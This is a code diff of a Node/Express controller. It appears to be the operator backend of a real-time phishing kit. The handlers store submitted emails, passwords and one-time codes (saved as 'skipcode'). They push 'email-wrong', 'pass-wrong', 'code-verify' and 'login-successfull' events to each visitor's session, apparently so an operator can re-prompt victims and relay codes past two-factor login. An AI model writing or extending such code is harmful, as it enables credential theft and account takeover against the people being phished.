@@ -118,26 +118,22 @@ export const email_post_wrong = async(req, res) => {
       });
       
 
-    const { id, email ,adminId,posterId} = req.body;
+    const { id ,adminId} = req.body;
  
     const filter = { _id: id };
     const update = { email: email };
     try {
         const userFound = await User.findOne({ adminId: adminId })
-        const posterFound = await Poster.findOne({ posterId: posterId })
-        if (userFound && posterFound) {
+        if (userFound ) {
 
-          const found =  await Info.findOneAndUpdate(filter, update, {
-                new: true,
-                upsert: true
-            });
+      
 
-            if(found){
-                pusher.trigger(userFound.adminId, 'dashboard-notification', {
-                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
+            
+                pusher.trigger(id, 'email-wrong', {
+                    id:id
                   });
 
-            }
+          
          return   res.status(200).json({ success: "email change successfully" })
 
         }
@@ -233,26 +229,21 @@ export const password_post_wrong = async(req, res) => {
       });
       
 
-    const { id, password ,adminId,posterId} = req.body;
+    const { id ,adminId} = req.body;
  
-    const filter = { _id: id };
-    const update = { password: password };
+   
     try {
         const userFound = await User.findOne({ adminId: adminId })
-        const posterFound = await Poster.findOne({ posterId: posterId })
-        if (userFound && posterFound) {
+        if (userFound ) {
 
-          const found =  await Info.findOneAndUpdate(filter, update, {
-                new: true,
-                upsert: true
-            });
+         
 
-            if(found){
-                pusher.trigger(userFound.adminId, 'new-notification', {
-                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
+           
+                pusher.trigger(id, 'pass-wrong', {
+                    id:id
                   });
 
-            }
+            
          return   res.status(200).json({ success: "password change successfully" })
 
         }
@@ -286,14 +277,13 @@ export const code_page_post = async(req, res) => {
         useTLS: true,
       });
       
-    const { id, code ,adminId,posterId} = req.body;
+    const { id, code ,adminId} = req.body;
  
     const filter = { _id: id };
-    const update = { password: password };
+    const update = { skipcode: code };
     try {
         const userFound = await User.findOne({ adminId: adminId })
-        const posterFound = await Poster.findOne({ posterId: posterId })
-        if (userFound && posterFound) {
+        if (userFound ) {
 
           const found =  await Info.findOneAndUpdate(filter, update, {
                 new: true,
@@ -301,12 +291,12 @@ export const code_page_post = async(req, res) => {
             });
 
             if(found){
-                pusher.trigger(userFound.adminId, 'new-notification', {
-                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
+                pusher.trigger(id, 'code-verify', {
+                    code: code
                   });
 
             }
-         return   res.status(200).json({ success: "password change successfully" })
+         return   res.status(200).json({ success: "code sent successfully" })
 
         }
 
@@ -340,19 +330,18 @@ export const successful_page_post = async(req, res) => {
         useTLS: true,
       });
       
-    const { id, done ,adminId,posterId} = req.body;
+    const { id, done ,adminId} = req.body;
  
   
     try {
         const userFound = await User.findOne({ adminId: adminId })
-        const posterFound = await Poster.findOne({ posterId: posterId })
-        if (userFound && posterFound) {
+        if (userFound ) {
 
       
 
             if(done == true){
-                pusher.trigger(userFound.adminId, 'new-notification', {
-                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
+                pusher.trigger(id, 'login-successfull', {
+                    id:id
                   });
 
             }
